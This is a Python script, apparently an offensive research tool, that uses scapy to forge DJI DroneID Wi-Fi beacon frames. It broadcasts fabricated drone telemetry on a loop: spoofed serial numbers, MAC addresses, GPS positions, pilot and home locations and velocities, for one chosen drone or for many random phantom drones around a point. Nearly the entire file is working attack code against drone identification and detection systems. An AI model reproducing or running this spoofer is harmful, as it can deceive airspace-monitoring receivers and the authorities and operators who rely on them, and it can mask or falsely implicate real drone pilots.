from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp
import random, string
from math import floor


class DroneID:
    common_header = b'Xb\x13'
    telemetry_byte = b'\x10'
    flight_info_byte = b'\x11'
    random_source = string.ascii_uppercase + string.digits


    def __init__(self,*args, **kwargs):
        print('args: ', args, ' kwargs: ', kwargs)
        

        # More than one argument means spoofin randomly
        if len(args) >= 1 : 
            # Args 0 = Number of spoofed drones / Args 1 = Spoofing point [long, lat]
            self.random_drone(int(args[0]), args[1])
        
        # Only one argument means we spoof a single drone
        else: # user input
            
            self.ssid = kwargs['ssid'] if len(kwargs["ssid"]) > 0 else 'MAVIC-AIR-FAKE11'
            self.state = b'\x02M\x063\x1f' # Dunno what's exactly that
            self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))
            
            # INPUT * 174533.0 little endian
            # ====== Locations ===========
            longitude = float(kwargs['lon']) if len(kwargs["lon"]) > 0  else random_location()[0]
            self.longitude = loc2bytes(longitude)
            latitude = float(kwargs['lat']) if len(kwargs["lat"]) > 0  else random_location()[1]
            self.latitude = loc2bytes(latitude)

            longitude_home = float(kwargs['home_lon']) if len(kwargs["home_lon"]) > 0  else random_location()[0]
            self.longitude_home = loc2bytes(longitude_home)
            latitude_home = float(kwargs['home_lat']) if len(kwargs["home_lat"]) > 0  else random_location()[1] 
            self.latitude_home = loc2bytes(latitude_home)

            #So far home and pilot location will be the same
            self.pilot_lon = loc2bytes(longitude_home)
            self.pilot_lat = loc2bytes(latitude_home)

            self.altitude = int(kwargs['altitude']) if len(kwargs['altitude']) > 0  else struct.pack('<H', randomN(0,2**16-1))       # Max 16 bits little endian unsgined
            self.height = struct.pack('<H', (randomN(0,2**16-1)))  # Max 16 bits little endian unsgined

            # ====== Drone axes motion ========
            self.v_north =  struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
            self.v_east = struct.pack('<h', randomN((-2**15),2**15-1))
            self.v_up =  struct.pack('<h', randomN((-2**15),2**15-1))  
            self.pitch = struct.pack('<h', randomN((-2**15),2**15-1))         
            self.roll = struct.pack('<h', randomN((-2**15),2**15-1))           
            self.yaw = struct.pack('<h', randomN((-2**15),2**15-1))            

            # ===== Drone's info =========
            self.prod_type = b'\x10'
            self.uuid = kwargs['uuid'] if len(kwargs['uuid']) > 0 else b'\x0f\x0f\x0f'
            self.uuid_len = len(self.uuid)

            [print(attribute, getattr(self, attribute)) for attribute in dir(self) if not attribute.startswith("__") and not callable(self)]

    '''
    Make all values of the drone random
    If point is None, no area limit. Limit spoofed area otherwise
    '''
    def random_drone(self, index=0, point=None):

        print("Point is ")
        print(point)
        self.ssid = ''.join(["FAKE-", str(index + 1 )])
        self.mac_address = "60:60:1f:%02x:%02x:%02x" % (randomN(0, 255), randomN(0, 255), randomN(0, 255))     # it also accepts non DJI OUI mac address            
        # Is this really the state?
        self.state = b'\x02M\x063\x1f' # Check the last byte what is exactly... SN length?
        self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))  # Must be 16 characters... missing 2 ?

        longitude, latitude = random_location(point)
        print("Drone at {} and {}".format(longitude, latitude))
        self.longitude = loc2bytes(longitude)
        self.latitude = loc2bytes(latitude)
        
        longitude_home, latitude_home = random_location(point) 
        self.longitude_home = loc2bytes(longitude_home)
        self.latitude_home = loc2bytes(latitude_home)

        pilot_lon, pilot_lat = random_location(point) 
        self.pilot_lon = loc2bytes(pilot_lon)
        self.pilot_lat = loc2bytes(pilot_lat)

        self.altitude = struct.pack('<H', (randomN(0,2**16-1)))     # Max 32 bits little endian
        self.height = struct.pack('<H', (randomN(0,2**16-1))) 
        self.v_north = struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.v_east = struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.v_up =  struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.pitch = struct.pack('<h', randomN((-2**15),2**15-1))          # 2 Bytes   little endian   signed
        self.roll = struct.pack('<h', randomN((-2**15),2**15-1))           # 2 Bytes   little endian signed
        self.yaw = struct.pack('<h', randomN((-2**15),2**15-1))            # 2 Bytes   little endian signed
        
        self.prod_type = b'\x10' # Make it random
        self.uuid = ''.join(random.choice(string.digits) for i in range(7))
        self.uuid_len = len(self.uuid)
    

    '''
    Builds the payload containing the DroneID  telemetry info
    '''
    def build_telemetry(self):

        drone2bytes = b''.join([DroneID.common_header,
        DroneID.telemetry_byte,
        self.state,
        attribute2byte(self.sernum),
        self.longitude,
        self.latitude,
        attribute2byte(self.altitude),
        self.height,
        self.v_north,
        self.v_east,
        self.v_up,
        self.yaw, # that changed from report.. it said pich here
        self.roll,
        self.pitch,
        b'\x00\x00\x00\x00', # Don't know what is going on with that field. It somehow modifies home location
        self.pilot_lat,
        self.pilot_lon,
        self.longitude_home,
        self.latitude_home, #  ToDo include pilotlocation
        self.prod_type,
        attribute2byte(self.uuid_len),
        attribute2byte(self.uuid)       
        ])
        
        drone2bytes = b''.join([drone2bytes,b'\x00'*(91 - len(drone2bytes))]) # some padding

        return drone2bytes

    '''
    Builds the payload containing the DroneID flight info
    '''
    def build_finfo(self, identification="identification", flight_info="info"):

        finfo_bytes = b''.join([DroneID.common_header,
        DroneID.flight_info_byte,  # 11
        attribute2byte(self.sernum),
        attribute2byte(str(len(identification))),  # ToDo-> max 0x7f, minimum of 10 bytes
        attribute2byte(identification),
        attribute2byte(str(len(flight_info))),
        attribute2byte(flight_info)])
        finfo_bytes = b''.join([finfo_bytes,b'\x00'*(147 - len(finfo_bytes))])  # some padding ...
        
        return finfo_bytes

'''
Convert a droneID parameter into byte representation if it's not already converted
'''
def attribute2byte(attribute, endiannes='<'):
    att_type = type(attribute)
    if att_type == str:
        p= str.encode(attribute)
        #print("Attribute {} {}: {}".format(attribute, att_type, p))
        return p

    elif att_type == int:
        p= struct.pack(''.join([endiannes,'h']), attribute)
        #print("Attribute {} {}: {}".format(attribute,att_type, p))
        return p
    elif att_type == float:

        p = struct.pack(''.join([endiannes,'f']), attribute)
        #print("Attribute {} {}: {}".format(attribute, att_type,p))
        return p
    else:
        #print("Attribute {}: {}".format(attribute,att_type))
        return attribute


'''
Returns a random location.
If a POINT is given, the random location is inside a raido of 11km around the point
'''
def random_location(point= None):
    if point is None:
        return random.uniform(-180,180), random.uniform(-90, 90)
    else:
        # It modifies the tenths of the given location, which suppose a max distance change of around 11km
        # https://en.wikipedia.org/wiki/Decimal_degrees
        # The random locations will be in a 11km radio with point as a center
        

        lon_new = float(point[0]) + randomN(0, 9) / 10
        lat_new = float(point[1]) + randomN(0, 9) / 10
        return lon_new, lat_new

'''
Conversion for the location coordinates. From Department's 13 report
'''
def loc2bytes(location):
    if location < 0:
        a = struct.pack('<i', floor(location * 174533))
    else:
        a = struct.pack('<i', floor(location * 174533))
    return a

'''
Random number between 'a' and 'b'
If number is negative we send the binary complement
To handle the signed integers
'''
def randomN(a,b):
    r = random.randint(a,b)
    if r < 0:
        r = ~r
    return r

'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet


'''
Function to spoof a single Drone
If it does not get any input, the parameters are set by default
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))

    # Define which parameters we can randomize ... it doesn't make sense to let the user set Yaw for example.

    #mac_address = str(input("Mac address:")) # ToDo check if it works with random... or it needs to start with DJI prefix
    #sn = str(input("Serial number (16 chars): " ))  
    #height = (input("Height: "))
    #v_north = (input("Velocity")) # That will just be to north.. need to implement other directon
    #pitch = (input("Pitch ([-180:180]): "))
    #roll = (input("Roll ([-180:180]): "))
    #yaw = (input("Yaw ([-180:180]): "))
    
    # Set drone's parameters
    drone = DroneID(ssid=ssid, lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)

    # Create base beacon packet associated to that drone
    beacon_base_packet = Beacon("", ssid).get_beacon()
    
    # Create the DJI payload in bytes and build the packet with scapy
    telemetry_payload = drone.build_telemetry()
    telemetry_packet = create_packet(beacon_base_packet, telemetry_payload)

    finfo_payload = drone.build_finfo() # ToDo Get user input to set flight info
    finfo_packet = create_packet(beacon_base_packet, finfo_payload)

    # Build a list of packets to be sent
    packet_list = []
    packet_list.append(telemetry_packet)
    packet_list.append(finfo_packet)
    sendp(packet_list, iface = interface, loop = 1, inter = 0.2)



def random_spoof(n, point=None):
    
    n_drones = n
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same
    # Create base beacon packet associated to that drone
    # Base beacon contains all the info of a beacon but the Vendor ID of DJI
    beacon = Beacon("", "" )
    beacon_base_packet = beacon.get_beacon()

    packet_list = [] # set of packets to be sent
    # First all packets are generated and then they will be sent afterwards
    for i in range( int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        drone = DroneID(i, point)
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))

        beacon_base_copy.ssid =  drone.ssid
        beacon_base_copy.addr2 = drone.mac_address
        
        # Build DJI Payload
        payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_copy, payload)
        packet_list.append(telemetry_packet)
    print("===========================")
    print("=========All drones are ready ==================")

    sendp(packet_list, iface = interface, loop = 1, inter = 0.3)


'''
Main part
Arguments indicate whether to spoof a single specific drone or N random drones
'''

parser = argparse.ArgumentParser()

parser.add_argument("-i", "--interface")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")
#parser.add_argument("-a", "--area", help="Spoof in a limited area", action='store_true')

parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: '46.7 7.66.'")



args = parser.parse_args()
print(args)
if not args.interface:
    raise SystemExit(f"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'longitude latitude'>\n \
-r N    Spoof N random drones. 2 by default\n \
-a location    If set, drones are spoofed around a random point in a radio of 11km.")

else:
    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        n_random = args.random
        print("Spoofing {} drones randomly".format(n_random))
        if args.area:
            point = args.area.split()
            print(point)
            random_spoof(n_random, point)
        random_spoof(n_random)
        
    else: 
        one_drone()